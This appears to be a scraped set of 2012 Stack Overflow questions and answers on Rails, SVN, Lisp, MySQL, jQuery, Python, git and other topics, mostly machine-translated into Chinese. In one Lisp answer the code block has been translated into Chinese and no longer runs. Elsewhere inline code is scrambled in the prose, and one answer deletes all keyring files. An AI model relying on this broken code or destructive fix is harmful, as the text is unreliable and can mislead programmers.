  actionpack (3.2.3) lib/action_dispatch/middleware/request_id.rb:22:in `call'
  rack (1.4.1) lib/rack/methodoverride.rb:21:in `call'
  rack (1.4.1) lib/rack/runtime.rb:17:in `call'
  activesupport (3.2.3) lib/active_support/cache/strategy/local_cache.rb:72:in `call'
  rack (1.4.1) lib/rack/lock.rb:15:in `call'
  actionpack (3.2.3) lib/action_dispatch/middleware/static.rb:62:in `call'
  railties (3.2.3) lib/rails/engine.rb:479:in `call'
  railties (3.2.3) lib/rails/application.rb:220:in `call'
  rack (1.4.1) lib/rack/content_length.rb:14:in `call'
  railties (3.2.3) lib/rails/rack/log_tailer.rb:14:in `call'
  rack (1.4.1) lib/rack/handler/webrick.rb:59:in `service'
  /Users/rob/.rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/webrick/httpserver.rb:138:in `service'
  /Users/rob/.rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/webrick/httpserver.rb:94:in `run'
  /Users/rob/.rvm/rubies/ruby-1.9.3-p125/lib/ruby/1.9.1/webrick/server.rb:191:in `block in     start_thread'

  Rendered /Users/rob/.rvm/gems/ruby-1.9.3-p125@admin/gems/actionpack-3.2\.    3/lib/action_dispatch/middleware/templates/rescues/routing_error.erb within rescues/layout (0.8ms)
[2012-11-07 18:02:13] ERROR bad Request-Line `'.
[2012-11-07 18:02:13] ERROR bad Request-Line `'.
[2012-11-07 18:02:13] ERROR bad Request-Line `'. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-08T15:20:13.963

我遇到了同样的问题，JS 和 CSS 文件随机无法在 Google Chrome 中加载，日志中显示此错误：

```
ERROR bad Request-Line `'. 
```

问题一定与 cookie 有关，但删除 cookie 对我不起作用。我通过重命名他们的密钥来解决问题，`config/initializers/session_store.rb`然后在问题消失后将其重命名。奇怪的。

# linux - Mint - Stored SVN password was changed and now unable to commit

> ID：13280040
> 
> 赞同：0
> 
> 时间：2012-11-07T23:23:51.180
> 
> 标签：linux, svn, linux-mint

I have a copy of a repo on my localhost with a saved username / password for the SVN repo.

The problem is that I changed my svn password (and would like to keep it that way) but every time I try to svn commit, it is asking for my GNOME keyring password (which I enter correctly). This is odd in the first place because I never had it ask me this before.

Then, after entering my password to the keyring, I get this error message:

> svn: OPTIONS of 'PATH_TO_CHANGED_FILES': authorization failed: Could not authenticate to server: rejected Basic challenge (REPO_URL)

This is happening on 2 repos that I have but a 3rd one is just fine.

When I disable authentication on the server, everything commits just fine and if I try to update / commit from another server, it also works just fine.

I tried adding the following lines to my ~/.subversion/servers:

> store-passwords = no
> 
> store-plaintext-passwords = no

And I also tried adding the following lines to my ~/.subversion/config:

> store-passwords = no
> 
> store-auth-creds = no

But those config file changes do nothing.

Is there a way for my localhost svn to forget the username and passwords I have entered for these repos (they were saved before) so I can get back to everything?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T10:20:47.203

I was able to solve this by deleting the keyring file for MATE. It is a bit of a brute way of doing it but it worked. You can delete the keyring file for MATE with the following command:

```
rm ~/.config/mate/keyrings/*.keyring 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:19:33.073

I don't know, how to remove stored data from keyring (old pass for repo), but you can try *to replace it*.

Use in console any SVN command, which will require authentication with additional options

```
Global options:
  --username ARG           : specify a username ARG
  --password ARG           : specify a password ARG 
```

and test repo-communication in usual way after it

About keyring pass-request:

Check settings in `~/.subversion/config`, `[auth]` section for `password-stores =`

Check settings in `~/.subversion/servers`, `[global]` section for

```
store-passwords =
store-plaintext-passwords = 
```

# compilation - 未调用变量

> ID：13280042
> 
> 赞同：0
> 
> 时间：2012-11-07T23:23:58.963
> 
> 标签：compilation, lisp

我正在尝试开始使用 Lisp，并且我有一些（凌乱的）代码，我希望能够向用户询问标题和网址。

将它们保存在一个变量中，然后在调用时将它们打印出来。我遇到了麻烦。首先我不知道如何编译我的程序来运行它。另外，有一次我运行它时，我收到一个关于变量标题未被调用的错误。任何人都可以帮助我解决这些问题吗？抱歉，我无法为您提供有关该错误的更多信息。

```
;;Define a function called make-cd that takes four parameters
(defun make-url( title url ))
    (list :title title :url url)

;;In the make-url function create a plist that takes the passed values

;; Define global variable db and set its value to nil
(defvar *db* nil)

;; Define a function that takes one paramter and pushes it to the make-url func.
;;(defun add-url (url) (push url *db*))

;; Define a function that takes the *db* variable and makes the output pretty
(defun dump-db ()
   (dolist (url *db*)
       (format t "~{~a:~10t~a~%~}~%" url)))

(defun prompt-read (prompt)
  (format *query-io* "~a: " prompt)
  (force-output *query-io*)
  (read-line *query-io*)) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T08:33:55.630

也许这会有所帮助。

Lisp 程序并不总是以编译的形式分发。将您的程序仅作为源代码甚至比仅使用 FASL（这就是 Lisp 二进制文件的名称）更好，因为如果以后发现问题，它可以更容易地解决问题。

传统上，更复杂的程序是通过 ASDF 包`asdf:defsystem`宏来安排的。你可以在这里阅读更多关于它的信息：http: [//common-lisp.net/~mmommer/asdf-howto.shtml](http://common-lisp.net/~mmommer/asdf-howto.shtml)。您可以在 Internet 上找到示例，这些示例通常通过使用[Quicklisp](http://www.quicklisp.org/)来完成，并查看其`~/quicklisp/dists/quicklisp/software/<name of the program>/`目录以查看其他程序的排列方式。

一旦系统由 定义`asdf:defsystem`，您将使用`asdf:oos`它来“操作”它，即加载它。然而，Quicklisp 已经成为一个非常流行且易于使用的实用程序，用于处理 Lisp 系统（它也使用下面的 ASDF 包）。所以，考虑到你有它，你会`(ql:quickload "your-system")`的。

为了通过 Quicklisp 使您的系统在本地可用，我建议您这样做：在您的`$HOME`目录中（在 Linux 上，它通常使用 tilde 别名`~`）在文件中：（`~/.config/common-lisp/source-registry.conf`您可能需要创建一个，如果它还没有的话)，添加如下内容：

```
(:source-registry
 (:tree (:home "quicklisp/quicklisp/"))
 (:tree (:home "Projects/my-project/"))
 :inherit-configuration) 
```

以上暗示该`~/Projects/my-project/`目录包含一个系统定义文件（*.asd），您在其中描述了哪些文件属于系统并说明了如何加载它们等。

有关添加本地项目的其他选项，请阅读[Quicklisp 常见问题解答](http://www.quicklisp.org/beta/faq.html)

有关 source-registry.conf 文件格式的更多信息，请阅读[ASDF 手册](http://common-lisp.net/project/asdf/asdf.html#Controlling-where-ASDF-searches-for-systems)。

这在开始时有点涉及，所以我建议你只使用 Quicklisp 安装一个项目并研究它是如何制作的。Alexandria 可能是一个好的开始 - 除了作为一个普遍有用的软件包之外，它不是很大并且很好地说明了这个问题，IMO。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:30:13.813

您提供的代码包含错误，无法编译。错误在于您对 make-url 的定义。正确的定义应该是：

```
(defun make-url( 标题 url )
      （列表：标题标题：url url））
```

注意括号位置的不同。

在您的代码中，参数列表后面有一个额外的括号。这关闭了 defun，导致 make-url 被评估为没有主体的函数。然后下一行被评估为对内置函数列表的调用。对参数进行了求值，但在尝试查找 title 的值时遇到了错误。全局环境中没有绑定，title 的绑定只存在于 make-url 的主体中。

此外，您对 add-url 的定义已被注释掉。在 Lisp 中，分号开始注释。

如何编译和运行您的程序取决于您使用的编译器。如果您使用的是 SBCL，则功能是[sb-ext:save-lisp-and-die](http://www.sbcl.org/manual/Saving-a-Core-Image.html)。像这样的简单程序通常会在 Read-Eval-Print-Loop(REPL) 中运行，大多数编译器会在启动时输入一个。如果您安装了 SBCL，您可以通过在命令提示符下输入命令“SBCL”来启动 repl。如果您的代码位于外部文件中，则可以使用[Load](http://www.lispworks.com/documentation/HyperSpec/Body/f_load.htm)加载该文件。

# java - 使用异步 HTTP 客户端 netty 客户端会在高负载下爆炸？

> ID：13280043
> 
> 赞同：3
> 
> 时间：2012-11-07T23:24:27.450
> 
> 标签：java, netty, asynchttpclient

我在使用 AsyncHTTPClient 测试的一些代码时遇到问题。这是一般配置

```
 this.config = (new AsyncHttpClientConfig.Builder())
            .setAllowPoolingConnection(true)
            .setAllowSslConnectionPool(true)
            .addRequestFilter(new ThrottleRequestFilter(10))
            .setMaximumConnectionsPerHost(20)
            //.setMaximumConnectionsTotal(20)
            .setRequestTimeoutInMs(100000)
            .build();
    this.client = new AsyncHttpClient(new NettyAsyncHttpProvider(config)); 
```

（请注意，由于使用 ThrottleRequestFilter 时出现一些奇怪的错误，最大连接数被注释掉，请参阅此处[https://groups.google.com/forum/?fromgroups=#!topic/asynchttpclient/nEnQnPtCP2g](https://groups.google.com/forum/?fromgroups=#!topic/asynchttpclient/nEnQnPtCP2g)）

现在这里是一些测试代码，

```
FileInputStream fstream = new FileInputStream("import.txt");
DataInputStream dstream = new DataInputStream(fstream);
BufferedReader reader = new BufferedReader(new InputStreamReader(dstream));
while ((line = reader.readLine()) != null) {
//Some code to build and create a request using the build function and then perform a GET operation. Request is built using Java's Future object from java.concurrent
} 
```

当 import.txt 文件少于 100 行这样的简单文本时

```
 196    242 3   881250949 
```

一切正常，所有请求都通过，当您检查响应时一切正常。任何超过 100 的东西，我都会开始超时，如果超过 1000，我实际上会开始遇到 permGen 内存错误。

我认为 ThrottleRequestFilter 应该将最大线程数限制为 10，并且一次只能处理 10 个。为什么当文本文件超过 100 行时它会爆炸？

我也尝试过切换到使用 Grizzly 实现，但这也会以同样的方式出现。我开始怀疑这要么是我编写测试代码的方式，要么是 Async HTTP Client 在创建大量请求时实际上存在一些问题。如果是这样，是否还有其他适用于 java 的好的异步 http 客户端？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:31:23.903

您的问题是您在开始读取文件之前没有设置任何缓冲区大小。看这个例子

```
private static final int EXT_DEFAULT_BUFFER_SIZE = 1024 * 8;
InputStream   inputStream=this.getClass().getClassLoader().getResourceAsStream("Resource_Name");
public static String copyLargeExt(InputStream input) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[EXT_DEFAULT_BUFFER_SIZE];
        int n = 0;
        while(-1 != (n = input.read(buffer))) {
            baos.write(buffer, 0, n);
        }
        return baos.toString();
    } 
```

# ruby-on-rails - Rails send_file 不播放 mp4

> ID：13280044
> 
> 赞同：5
> 
> 时间：2012-11-07T23:24:29.387
> 
> 标签：ruby-on-rails, ruby, video-streaming, ruby-on-rails-3.2

我有一个 Rails 应用程序可以保护上传的视频，将它们放入私人文件夹。

现在我需要播放这些视频，当我在控制器中做这样的事情时：

```
 def show
    video = Video.find(params[:id])
    send_file(video.full_path, type: "video/mp4", disposition: "inline")
  end 
```

并在 /videos/:id 打开浏览器（Chrome 或 FF），它不会播放视频。

如果我将相同的视频放在公共文件夹中，并像 /video.mp4 一样访问它，它将播放。

如果我删除 dispositon: "inline" 它将下载视频，我可以从我的计算机上播放它。webm 视频也会发生同样的情况。

我错过了什么？这有可能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2016-06-01T13:28:48.247

要流式传输视频，我们必须为某些浏览器处理请求的[字节范围。](https://en.wikipedia.org/wiki/Byte_serving)

## 解决方案 1：使用`send_file_with_range`gem

简单的方法是使用[send_file_with_range gem](https://github.com/adamcooke/send_file_with_range)`send_file`修补方法。

在 Gemfile 中包含 gem

```
# Gemfile
gem 'send_file_with_range' 
```

并提供以下`range: true`选项`send_file`：

```
def show
  video = Video.find(params[:id])
  send_file video.full_path, type: "video/mp4", 
    disposition: "inline", range: true
end 
```

[补丁](https://github.com/adamcooke/send_file_with_range/blob/master/lib/send_file_with_range/controller_extension.rb)很短，值得一看。但是，不幸的是，它不适用于 Rails 4.2。

## `send_file`解决方案 2：手动修补

受 gem 的启发，手动扩展控制器相当容易：

```
class VideosController < ApplicationController

  def show
    video = Video.find(params[:id])
    send_file video.full_path, type: "video/mp4",
      disposition: "inline", range: true
  end

private

  def send_file(path, options = {})
    if options[:range]
      send_file_with_range(path, options)
    else
      super(path, options)
    end
  end

  def send_file_with_range(path, options = {})
    if File.exist?(path)
      size = File.size(path)
      if !request.headers["Range"]
        status_code = 200 # 200 OK
        offset = 0
        length = File.size(path)
      else
        status_code = 206 # 206 Partial Content
        bytes = Rack::Utils.byte_ranges(request.headers, size)[0]
        offset = bytes.begin
        length = bytes.end - bytes.begin
      end
      response.header["Accept-Ranges"] = "bytes"
      response.header["Content-Range"] = "bytes #{bytes.begin}-#{bytes.end}/#{size}" if bytes

      send_data IO.binread(path, length, offset), options
    else
      raise ActionController::MissingFile, "Cannot read file #{path}."
    end
  end

end 
```

## 进一步阅读

因为，起初，我不知道 和 之间的区别`stream: true`，`range: true`我发现这个 railscast 很有帮助：

[http://railscasts.com/episodes/266-http-streaming](http://railscasts.com/episodes/266-http-streaming)

# mysql - 消除基于mysql中较旧日期的重复项

> ID：13280045
> 
> 赞同：0
> 
> 时间：2012-11-07T23:24:32.133
> 
> 标签：mysql

想象一下……一个人将关于计算机的一行数据添加到 mysql 中，然后他再次添加另一行基本相同的数据行，只是日期不同，每个日期总是带有插入标记。

我希望能够消除重复并仅显示最近的行。

假设我们有一个包含 3 个字段的“计算机”表：ID、COMPUTER、DATEADD

桌子里面是这样的

```
1, dell, 2010-10-09
2, dell, 2011-10-10
3, gateway, 2010-03-03
4, dell, 2010-02-02 
```

简单，好的...我如何摆脱戴尔的重复，只获得最新日期的戴尔？

我试过这个查询：

```
 SELECT * 
  FROM  `computers` 
  GROUP BY computer
  ORDER BY dates ASC 
```

它没有像我预期的那样执行 - 日期不是最新的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T23:30:56.270

根据评论修改

```
SELECT * FROM
computers
INNER JOIN
(SELECT computer, MAX(dates) as dates
FROM computers
GROUP BY computer) AS max_dates ON computers.computer = max_dates.computer AND computers.dates = max_dates.dates 
```

或者您可以更改表结构以在计算机字段上具有唯一索引，然后只需将所有数据插入作为`REPLACE INTO`查询，这样您就不会有重复项，如果您不关心条目历史记录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:12:36.197

使用`DESC`代替`ASC`：

```
SELECT * 
FROM  `computers` 
GROUP BY computer
ORDER BY dateadd DESC; 
```

**更新 1**

另一个镜头：

```
SELECT *
  FROM computers c
 WHERE dateadd = (SELECT MAX(dateadd) 
                    FROM computers 
                   WHERE computer = c.computer) 
```

但是，如果您在同一台计算机上有两个或多个条目，则可能会出现一些问题。

# jquery - jQuery 检查 TD 内的右侧复选框

> ID：13280049
> 
> 赞同：3
> 
> 时间：2012-11-07T23:24:54.193
> 
> 标签：jquery, checkbox

你可以在这里看到我的问题[http://jsfiddle.net/eWh5F/76/](http://jsfiddle.net/eWh5F/76/) () 我想要的是点击 TD 并且复选框应该被选中/取消选中对于 TD 内的复选框可以正常工作但是当我有一张桌子里面有一个TD和TD里面那个，有什么解决办法吗？我在下面尝试过这样的东西，但没有运气

```
$("td").click(function(e) {
var checkbox = $(':checkbox', $(this).parent()).get(0);
var checked = checkbox.checked;
if (checked == false) checkbox.checked = true;
else checkbox.checked = false;}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:28:42.693

您可以使用`prop`方法：

```
$("td").click(function(e) {
    $('> input[type=checkbox]', this).prop('checked', function(i, checked){
       return !checked
    })
}); 
```

[http://jsfiddle.net/jdy3d/](http://jsfiddle.net/jdy3d/)

请注意，`:checkbox`选择器已弃用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T23:34:57.173

您可以使用`e.stopPropagation();`

```
$("td").click(function(e) {
    e.stopPropagation();
    var checkbox = $('input[type="checkbox"]', $(this).closest('td')).get(0);
    var checked = checkbox.checked;
    if (checked == false) checkbox.checked = true;
    else checkbox.checked = false;
});​ 
```

`:checked`不**推荐**使用`input[type="checkbox"]`_

也使用`$(this).closest('td')` 代替`$(this).parent()`

[**JSFIDDLE 演示**](http://jsfiddle.net/sushanth009/eWh5F/77/)

# eclipse - 在 Eclipse 中打开 Pydev 编辑器

> ID：13280052
> 
> 赞同：0
> 
> 时间：2012-11-07T23:25:04.870
> 
> 标签：eclipse, editor, pydev

我是在 Eclipse 中使用 pydev 的新手。我如何开始在编辑器中工作。我已经完成了所有的配置。和项目设置，但不能使用编辑器。涉及哪些步骤？你能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:56:13.443

If everything is set up you should be able to follow these steps:

*   Right click on your project and select `New -> PyDev Module`
*   Enter a name for your module and click `Finish`
*   The editor will open and you can start coding

# php - 将 Ajax 与 JSONP 结合使用时未获得预期响应

> ID：13280053
> 
> 赞同：0
> 
> 时间：2012-11-07T23:25:19.880
> 
> 标签：php, jquery, html, ajax, json

我正在尝试使用 jsonp。

目前我有一个下面列出的带有 ajax 的 html 页面，其中包含一个下拉框表单以及一个表格。最初只有标题，它依赖于 ajax 获取 jsonp 响应以填充其他单元格。

然后我也托管了我的响应 php，我认为一切都是正确的，但显然不是。

除非我忽略了一个，否则我所有的 id 似乎都是正确的，所以我真的不明白为什么我得到的只是来自 jsonp 页面的错误响应。

html页面：

```
<html>
<head>
        <title>Car Queries</title>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>
        <script type="text/javascript">
        $(document).ready(function()
        {
                $("#submitbutton").click(function()
                {
                        $.ajax(
                        {
                                url: "https://example.com/jsonServer.php",
                                type: "GET",
                                dataType: "jsonp",
                                jsonp: "callback",
                                data: { car: $("#carselection").val()},
                                success: function(data)
                                {
                                        if(data.name == "error")
                                        {
                                                $("#outputcarname").text("There is no such car available"),
                                                $("#price").text(" "),
                                                $("#mpg").text(" ");
                                        }
                                        else
                                        {
                                                $("#outputcarname").text("data.name"),
                                                $("#price").text("data.price"),
                                                $("#mpg").text("data.mpg ");
                                        }
                                },
                                error: function()
                                {
                                        $("#outputcarname").text("There is a problem with the server"),
                                        $("#price").text(" "),
                                        $("#mpg").text(" ");
                                }
                        });
                return false;
                });
        });
        </script>
</head>
<body>

        <h1>Cars Cars Cars!</h1>
        <form action="" method="POST">

        <select id="carselection">
                <option selected="selected">Pick a Car</option>
                <option value="Maxima">Maxima</option>
                <option value="Element">Element</option>
                <option value="Prius">Prius</option>
        </select>
        </br></br>
        <input type="submit" id="submitbutton" value="Submit">
        </form>
        </br>
        <center><table>
                <tr>
                        <th>Car Name</th>
                        <th>Price</th>
                        <th>MPG</th>
                </tr>
                <tr>
                        <td id="outputcarname"></td>
                        <td id="price"></td>
                        <td id="mpg"></td>
                </tr>
        </table></center>
</body>
</html> 
```

响应 JSONP/PHP：

```
<?php

$cars = array('Maxima' => array('price' => '$32,780', 'mpg' => '24'),
              'Prius' => array('price' => '$25,565', 'mpg' => '49'),
              'Element' => array('price' => '$22,075', 'mpg' => '22'));

if(array_key_exists($_GET['carselection'], $cars))
{
        $carname = $_GET['carselection'];
        $results = array('name' => $carname, 'price' => $cars[$carname]['price'], 'mpg' => $cars[$carname]['mpg']);
}
else
{
        $results = array('name' => 'error');
}

$callback = htmlentities($_GET['callback'], ENT_QUOTES);
print $callback . '(' . json_encode($results) . ')';
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:27:35.990

改变

```
data: { car: $("#carselection").val()}, 
```

到

```
data: { carselection: $("#carselection").val()}, 
```

您还需要删除`""`from `data.name`、`data.price`和`data.mpg`。

```
else
   {
    $("#outputcarname").text(data.name),
    $("#price").text(data.price),
    $("#mpg").text(data.mpg); 
```

# wpf - WPF 在鼠标悬停时突出显示树视图行。

> ID：13280054
> 
> 赞同：0
> 
> 时间：2012-11-07T23:25:20.523
> 
> 标签：wpf, treeview

我有一个关于如何在树视图中的鼠标悬停事件中仅突出显示一行的问题。我添加了触发器

```
 <MultiTrigger>
                        <MultiTrigger.Conditions>
                            <Condition Property="IsMouseOver" Value="True"></Condition>
                        </MultiTrigger.Conditions>
                        <Setter TargetName="Bd" Property="Background" Value="{DynamicResource {x:Static SystemColors.HighlightBrushKey}}"></Setter>
     </MultiTrigger> 
```

但我得到以下结果：

这里图片：http://i.stack.imgur.com/j9N3x.png

如您所见，每个项目的父项也突出显示。在此示例中 - 鼠标位于 TempPE 项目上。

# ruby - ruby 1.9.3 不能使用 open3（未初始化的常量 ConfigureController::Open3）

> ID：13280055
> 
> 赞同：11
> 
> 时间：2012-11-07T23:25:22.097
> 
> 标签：ruby

该项目在 Ruby 1.9.2 中运行良好，但我想使用 1.9.3。

这条线在 1.9.2 中运行良好：

```
 o, e, s = Open3.capture3("echo a; sort >&2", :stdin_data=>"foo\nbar\nbaz\n") 
```

但是在 1.9.3 中，我得到

`uninitialized constant ConfigureController::Open3`

我必须安装模块还是什么？谢谢！

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-07T23:47:03.107

你`require 'open3'`在源文件的顶部吗？以前可能是您需要的其他东西又需要它，但现在在 1.9.3 中不是。您可能需要明确要求它。

# python - 将指针数组传递给 python 类

> ID：13280056
> 
> 赞同：1
> 
> 时间：2012-11-07T23:25:23.923
> 
> 标签：python, class, pointers, for-loop, python-2.7

我是 python 新手。我熟悉 C++。我会将流动的 C++ 代码转换为 python。

```
class School{
    School(char *name, int id, Student* pointers){
    {
        this.name=name;
        this.weapon=weapon;
        this.students=pointers;
    }
    print(){
        for(int i=0;i<10;i++){
            this.students.print();
        }
    }
}; 
```

如您所见，我正在尝试将指针传递给 Student 类型的对象数组，我不确定 python 是否允许我传递指针。这就是我在 python 中所做的

```
class School():
    def __init__(self, name, *students):
        self.name=name
        self.students=students

    def display(self):
        for student in self.students
            student.display() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T02:45:12.233

您输入的内容基本上就是您想要的，但有一个关键区别。注意学生之前没有星号：

```
class School():
    def __init__(self, name, students):
        self.name=name

        self.students=students

    def display(self):
        for student in self.students:
            student.display() 
```

这意味着您将像这样实例化一所学校（为学生构建一个构造函数）：

```
s1 = Student('Bob')
s2 = Student('Fill')

school = School("Generic School",[s1,s2]) 
```

如果您的`__init__`方法看起来像`def __init__(self, name, *students):`，那么您将实例化**完全相同的学校**：

```
s1 = Student('Bob')
s2 = Student('Fill')

school = School("Generic School",s1,s2) 
```

原因是`*students`in `__init__`（这适用于任何方法）意味着“获取其余传递的非关键字参数并将它们粘贴到`student`列表中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T23:41:07.253

在 python 中，将整个列表传递给构造函数是完美的。
无论如何，Python 都会将该列表作为参考传递。

```
class School():
    def __init__(self, name, students):
        self.name=name
        self.students=students

    def display(self):
        for student in self.students
            student.display() 
```

在这种情况下`self.students`是对原始`students`列表的引用

* * *

一个很好的测试方法是下面的代码：

```
original = ['a','b']

class my_awesome_class:
    def __init__(self, a):
        self.my_list = a

    def print_list(self):
        self.my_list.append("my_awesome_class")
        print(self.my_list)

my_class = my_awesome_class(original)

print (original)
my_class.print_list()
print (original) 
```

[如需额外阅读，您可能需要从 ac 角度](http://rg03.wordpress.com/2007/04/21/semantics-of-python-variable-names-from-a-c-perspective/)查看python 变量名称

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T00:01:17.303

Python没有指针。或者更确切地说， Python 中的*所有内容*都是一个指针，包括名称、列表中的条目、属性…… Python 是一种“通过引用”的语言。

下面是几个简单的例子：

```
In [1]: a = ['hello', tuple()]  # create a new list, containing references to
                                # a new string and a new tuple. The name a is
                                # now a reference to that list.

In [2]: x = a  # the name x is a reference to the same list as a.
               # Not a copy, as it would be in a pass-by-value language

In [3]: a.append(4)  # append the int 4 to the list referenced by a

In [4]: print x
['hello', (), 4]  # x references the same object

In [5]: def f1(seq):  # accept a reference to a sequence
   ...:     return seq.pop()  # this has a side effect:
                              # an element of the argument is removed.

In [6]: print f1(a)  # this removes and returns the last element of
4                    # the list that a references

In [7]: print x  # x has changed, because it is a reference to the same object
['hello', ()]

In [8]: print id(a), id(x)
4433798856 4433798856  # the same

In [9]: x is a  # are x and a references to the same object?
Out[9]: True 
```

Python 提供了高级构造来执行您需要在 C 中进行指针运算的事情。因此，您无需担心给定变量是否为指针，就像您无需担心内存管理一样。

# jquery - iPad 上的 Colorbox HTML5 视频显示

> ID：13280059
> 
> 赞同：1
> 
> 时间：2012-11-07T23:26:07.667
> 
> 标签：jquery, ios, ipad, html5-video, colorbox

我正在尝试通过内联 Colorbox 显示 HTML5 视频标签，但无法在 iPad 上运行。我正在使用的 jQuery 是：

```
$(document).ready(function(){
  $("#openColorbox").colorbox({
    inline:true, 
    width:"80%", 
    height:"auto", 
    href:"#video"
  });
}); 
```

这是该问题的 JSFiddle 示例：http: [//jsfiddle.net/lightstrike/pKUJK/](http://jsfiddle.net/lightstrike/pKUJK/)

我在 iPad 上遇到了两个问题：

1.  Colorbox 中显示的视频是黑色的并且没有控件*（非常重要）*
2.  单击文本以触发颜色框不起作用，但单击图像可以*（不太重要）*

作为对可能发生的任何其他问题的控制，我还创建了一个只有 HTML5 视频的 JSFiddle，它在 iPad 上运行良好：http: [//jsfiddle.net/lightstrike/XHEWe/](http://jsfiddle.net/lightstrike/XHEWe/)

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-27T23:19:13.880

1.  您是否考虑过在触摸设备上禁用 Colorbox？
2.  看起来 Mobile Safari 不喜欢`<p>`元素上的点击事件。将其更改为类似`<a href="#">`. 您可能还需要更具体地使用 jQuery 选择器，`$("#openColorbox > a")`. 但是如果你这样做，由于某种原因，Colorbox 不显示视频......我从来没有对 Colorbox 的内联感到幸运。

# android - 安装 Android 应用程序时将静态数据加载到 SqlLite DB

> ID：13280064
> 
> 赞同：2
> 
> 时间：2012-11-07T23:26:19.817
> 
> 标签：android, sqlite, ormlite

我们的应用程序中有几个表，每个表都是在创建数据库时通过 RAW sql 文件填充的，即第一次安装应用程序。即使用

```
executeSqlScript( dao, sqlFile ) 
```

每个表都有 1 个 sql 文件。目前这是直截了当的，但随着表数量的增加，sql 文件的数量也会增加。有没有更好的方法来填充数据库？将静态数据存储在 XML 文件中并将其反序列化为域对象并通过 OrmLite 持久化这些是更好的选择，还是我缺少其他一些技巧？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:14:30.053

我还在决定如何在一个 Android 应用程序中访问 Sqlite 数据库。最后我得到了 OrmLite。基本上是因为我不喜欢将 SQL 语句硬编码为 Java 代码。我正在寻找类似于 Hibernate 但对 Android 来说足够“精简”的东西。

OrmLite 不仅根据您的领域对象创建您的表，因此您无需编写 SQL 创建脚本。但是通过创建 Java 对象并将它们保存到 DB 来填充 SqLite 数据库也很容易。

只有当我使用该`OrmLiteSqliteOpenHelper.onUpgrade()`方法升级数据库时才需要编写 SQL 脚本。在这种情况下，需要编写`ALTER TABLE`语句。否则，您可以使用纯 Java 来操作 SqlLite DB。如果您为每个表创建 1 个 Java 文件，这取决于您。或者，您在单个 Java 文件中填充多个表。这样做的好处是您编写了由 Java 编译器验证的 Java 代码。如果您将 SQL 语句硬编码为字符串，则情况并非如此。

如果你有很多初始化数据，你可以很容易地获取 XML 文件中的数据。然后将 XML 反序列化为域对象并使用 OrmLite 将它们存储到 DB 也可能是一种解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:04:43.563

当然有。如果每个文件都有一个表，则可以直接使用[数据库浏览器将这些文件](http://sqlitebrowser.sourceforge.net/)**合并**到一个 sql 文件甚至一个 db 文件中。

# git - Git：修复noobish错误以避免变基地狱

> ID：13280065
> 
> 赞同：4
> 
> 时间：2012-11-07T23:26:23.057
> 
> 标签：git, git-rebase

我对 git 有点陌生，我决定直接跳进去，而不是给自己一个合适的教程。在一个项目上工作了一个月后，我给自己惹了点小麻烦。我在某个时间点决定我不喜欢某段特定代码的结果，所以那时，B，我分支到 E，删除了有问题的文件，并将其重新创建为一个全新的文件。显然最好的办法是 git rm 而不是仅仅删除文件......我现在需要重新设置 E 以从 C 分支出来，但由于与重新设置冲突，我不确定如何管理它，因为两个分支中的文件都发生了变化。我的目标基本上是让从 E 开始的分支继续使用新文件，但将 C 的更改合并到新分支中。任何帮助弄清楚如何管理变基，

```
A -> B -> C -> D
     \
       E -> F -> G 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T16:32:55.570

您的结论性陈述告诉我，您正在寻找的是将 C 中的特定文件，甚至更好的 D 中的特定文件与 G 中的相同文件合并。这样，您将拥有从 E 到 G 的新文件，包括更改你用 C 语言制作的，我认为它也在 D 语言中。

可以在分支之间合并特定文件。由于我没有这样做的经验，因此我将向您推荐几个描述如何做到这一点的链接：

[http://jasonrudolph.com/blog/2009/02/25/git-tip-how-to-merge-specific-files-from-another-branch/](http://jasonrudolph.com/blog/2009/02/25/git-tip-how-to-merge-specific-files-from-another-branch/)

[如何将更改合并到单个文件，而不是合并提交？](https://stackoverflow.com/questions/10784523/how-do-i-merge-changes-to-a-single-file-rather-than-merging-commits)

我希望这有帮助。

# html - 如何创建两列布局

> ID：13280067
> 
> 赞同：1
> 
> 时间：2012-11-07T23:26:32.407
> 
> 标签：html, css

我想知道是否有一种方法可以使用以下内容设置两列布局：

我有

```
<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

<div>
   <div>title </div>
   <div>content </div>
   <div>name </div>
   <div>data </div>
</div>

more.... 
